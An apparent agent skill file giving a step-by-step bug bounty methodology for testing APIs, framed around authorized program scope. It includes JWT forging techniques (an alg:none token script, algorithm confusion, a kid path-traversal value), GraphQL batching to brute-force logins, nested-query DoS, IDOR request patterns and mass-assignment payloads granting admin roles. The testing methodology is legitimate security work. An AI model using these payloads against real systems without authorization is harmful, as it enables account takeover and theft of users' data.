---
name: bb-api-testing
description: Structured API security testing for authorized bug bounty targets. Covers REST endpoint enumeration, GraphQL introspection and attacks, JWT algorithm confusion, broken object-level authorization (BOLA/IDOR), mass assignment, and API versioning issues. Use when asked to "test this API", "find API vulnerabilities", "test GraphQL", "check JWT security", "look for IDOR in the API", "test API authentication", or "enumerate API endpoints".
---

# Bug Bounty API Testing

Systematically test an authorized API for authentication, authorization, and logic vulnerabilities.

## Prerequisite

Confirm the API endpoint is within the authorized program scope. Record the base URL, authentication method, and any rate-limit or sensitivity notes from the program brief.

## Step 1: API Discovery and Enumeration

Before testing, map all available endpoints:

```bash
BASE="https://api.example.com"

# Check for OpenAPI / Swagger documentation (often left exposed)
curl -s $BASE/swagger.json
curl -s $BASE/openapi.json
curl -s $BASE/api-docs
curl -s $BASE/v1/swagger.json
curl -s $BASE/docs

# Check for GraphQL endpoint
curl -s $BASE/graphql
curl -s $BASE/api/graphql
curl -s $BASE/query

# Fuzz for undocumented endpoints
ffuf -u $BASE/FUZZ \
  -w ~/tools/SecLists/Discovery/Web-Content/api-endpoints.txt \
  -mc 200,201,204,400,401,403 \
  -rate 30 -o api-fuzz.json

# Extract endpoints from JavaScript files
gau example.com | grep "\.js$" | \
  xargs -I{} curl -s {} | \
  grep -oP '"(/api/[^"]+)"' | sort -u
```

Also check for versioned API paths: `/v1/`, `/v2/`, `/api/v1/`, `/api/v2/`. Authorization controls are frequently missing on older versions.

## Step 2: Authentication Testing

### 2.1 JWT Analysis

If the application uses JWT tokens, decode and inspect them:

```bash
# Decode without verification (base64)
TOKEN="eyJhbGciOiJSUzI1NiJ9..."
echo $TOKEN | cut -d. -f1 | base64 -d 2>/dev/null | jq .  # Header
echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null | jq .  # Payload
```

**JWT attack checklist:**

| Attack | How to test |
|---|---|
| `alg: none` | Change header to `{"alg":"none"}`, remove signature, send token |
| RS256 → HS256 confusion | Change `alg` to `HS256`, sign with the server's public key as the HMAC secret |
| Weak secret brute force | Run `hashcat -a 0 -m 16500 TOKEN wordlist.txt` or use jwt-cracker |
| `kid` header injection | If `kid` is a filename: set to `../../../../dev/null` (empty HMAC key) |
| `jku` / `x5u` header injection | Point to your own JWKS endpoint with a key you control |
| Expired token acceptance | Replay a token past its `exp` claim |
| Privilege escalation | Change `role`, `admin`, or `scope` claim and re-sign |

```bash
# Test alg:none attack
python3 -c "
import base64, json
header = base64.urlsafe_b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).rstrip(b'=')
payload = base64.urlsafe_b64encode(json.dumps({'sub':'1','role':'admin'}).encode()).rstrip(b'=')
print(f'{header.decode()}.{payload.decode()}.')
"
```

### 2.2 API Key Issues

```bash
# Test if API key is required
curl -s https://api.example.com/v1/users

# Test if key is validated (try an obviously fake key)
curl -s -H "X-API-Key: FAKE123" https://api.example.com/v1/users

# Check if key appears in URL (insecure — logs it)
# Look for: ?api_key=, ?token=, ?access_token= in JS or docs
```

## Step 3: Authorization Testing (BOLA / IDOR)

Broken Object Level Authorization (BOLA) is the most common high-severity API finding.

**Setup:** Create two test accounts (Account A and Account B) if the program allows it.

**Testing pattern:**
```bash
# 1. Log in as Account A, retrieve an object
GET /api/v1/orders/12345
Authorization: Bearer TOKEN_A
# Response: order data for Account A

# 2. Use Account A's token to request Account B's object
GET /api/v1/orders/12346  ← Account B's order ID
Authorization: Bearer TOKEN_A
# If order data returns → BOLA confirmed
```

**ID enumeration strategies:**
- Increment integer IDs: `1, 2, 3...`
- UUID: look for UUIDs in other responses (profile pages, emails, etc.)
- Hash-based IDs: try to decode (often base64 or MD5 of an integer)

**Horizontal vs vertical escalation:**

| Type | Example | Severity |
|---|---|---|
| Horizontal | User A reads User B's data | High |
| Vertical | Regular user accesses admin endpoints | Critical |
| Cross-tenant | Tenant A reads Tenant B's data | Critical |

### 3.1 Broken Function Level Authorization

Test whether non-admin users can access admin-level functions:

```bash
# Try admin endpoints with a regular user token
GET /api/v1/admin/users
GET /api/v1/admin/config
POST /api/v1/admin/users
DELETE /api/v1/users/OTHER_USER_ID

# Try HTTP method switching
# If GET /api/v1/users/123 returns 200, try:
DELETE /api/v1/users/123
PUT /api/v1/users/123
PATCH /api/v1/users/123
```

## Step 4: GraphQL Testing

### 4.1 Introspection

If introspection is enabled (common in non-production or misconfigured prod):

```bash
curl -s -X POST https://api.example.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { types { name fields { name } } } }"}' | jq .
```

Introspection enabled on production = Medium finding (information disclosure, not directly exploitable but aids further attack).

Use GraphQL Voyager or InQL to visualize the schema and identify interesting types and mutations.

### 4.2 GraphQL-Specific Attacks

```bash
# Batching attack — bypass rate limiting by sending many operations at once
curl -s -X POST https://api.example.com/graphql \
  -H "Content-Type: application/json" \
  -d '[
    {"query": "mutation { login(email: \"a@a.com\", password: \"pass1\") { token } }"},
    {"query": "mutation { login(email: \"a@a.com\", password: \"pass2\") { token } }"},
    ...100 more...
  ]'

# IDOR via GraphQL — swap IDs in queries
{"query": "{ order(id: \"OTHER_USER_ORDER_ID\") { total items } }"}

# Nested query DoS (if no depth limiting)
# Confirm program allows DoS testing before attempting
{"query": "{ users { friends { friends { friends { name } } } } }"}
```

### 4.3 Mutation Testing

List all mutations from introspection and test each for:
- Missing authorization (`deleteUser`, `updateRole`, `createAdmin`)
- Mass assignment via input types
- Unauthenticated access to sensitive mutations

## Step 5: Mass Assignment

Send additional fields in write requests that shouldn't be user-controllable:

```bash
# Original request
PATCH /api/v1/users/me
{"name": "Alice"}

# Add privileged fields
PATCH /api/v1/users/me
{"name": "Alice", "role": "admin", "is_verified": true, "credits": 99999, "email_verified": true}

# Also try on registration endpoints
POST /api/v1/users
{"email": "test@test.com", "password": "pass", "role": "admin"}
```

If any extra fields are accepted without error, test whether they take effect by reading the object back.

## Step 6: API Versioning and Deprecation Issues

```bash
# Test older API versions — auth controls often weaker
GET /api/v1/admin/users    ← returns 403
GET /api/v0/admin/users    ← may return 200
GET /api/beta/admin/users  ← may be less hardened
GET /api/internal/users    ← may have no auth at all

# Check mobile app API versions (often behind web app in security fixes)
# Decompile APK and search for hardcoded base URLs
```

## Step 7: Common Issues Checklist

Work through this before moving on from API testing:

- [ ] OpenAPI/Swagger docs exposed? (info disclosure)
- [ ] JWT: alg:none, algorithm confusion, weak secret?
- [ ] BOLA: test object IDs from Account A with Account B's token
- [ ] Admin endpoints accessible with regular token?
- [ ] GraphQL introspection enabled in production?
- [ ] GraphQL batching enables rate limit bypass?
- [ ] Mass assignment: privileged fields accepted in PATCH/PUT?
- [ ] Old API versions (`/v0/`, `/v1/` vs current) with weaker auth?
- [ ] API keys in URLs (logged in server access logs)?
- [ ] Unauthenticated endpoints returning sensitive data?
- [ ] Rate limiting: is brute force of OTP/password possible?

## Step 8: Severity Assessment

| Finding | Severity |
|---|---|
| JWT algorithm confusion → arbitrary user impersonation | Critical |
| BOLA cross-tenant data access | Critical |
| Admin function accessible to regular user | Critical |
| BOLA same-tenant horizontal access | High |
| GraphQL batching → MFA/OTP brute force | High |
| Mass assignment → privilege escalation | High |
| JWT weak secret → forged tokens | High |
| Introspection enabled in production | Medium |
| API key in URL parameters | Medium |
| Old API version with missing auth | High |

Once a finding is confirmed, invoke `bb-report-writer` to draft the submission.

Read `references/api-payloads.md` for ready-to-use payload templates for each attack class.
